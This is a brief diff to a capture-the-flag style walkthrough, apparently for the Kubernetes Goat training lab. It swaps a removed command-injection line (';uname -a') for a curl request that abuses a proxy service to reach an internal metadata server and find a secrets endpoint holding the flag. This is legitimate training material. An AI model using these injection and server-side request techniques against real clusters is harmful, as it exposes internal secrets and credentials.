@@ -1,8 +1,8 @@
 ## Interacting with Metadata server
-* Next we can download the official `docker` static binary from the internet [https://download.docker.com/linux/static/stable/](https://download.docker.com/linux/static/stable/). In order to determine which binary we need, we can run the following command for system discovery
+We can explore the metadata server by changing the endpoint 
 
 ```bash
-;uname -a
+curl -H 'content-type: application/json' localhost:1234 --data-raw '{"endpoint":"http://metadata-db/latest/","method":"GET","headers":""}' 
 ```
 
 After enumerating through the entire key values, finally we can see that there is a flag at http://metadata-db/latest/secrets/kubernetes-goat endpoint.
